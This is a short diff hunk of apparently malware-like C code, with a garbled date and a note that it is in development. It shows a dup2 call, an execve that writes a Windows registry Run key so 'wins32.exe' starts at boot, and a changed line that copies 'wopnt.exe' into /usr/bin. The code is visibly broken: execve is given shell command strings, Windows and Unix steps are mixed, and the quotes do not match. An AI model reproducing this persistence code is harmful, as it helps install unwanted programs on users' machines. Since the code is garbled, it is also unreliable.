@@ -104,7 +104,7 @@ terraquian date: 4/5/20178 - 0415:55 -PM *** in desenvolpment.
      dup2(x, 0);
 
      execve("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /v wins32 /d C:/wins32.exe",0,0);
-     execve("cp wopnt.exe /usr/bin,NULL,NULL"); 
+     execve("cp wopnt.exe /usr/bin",NULL,NULL"); 
      return;
 
   }
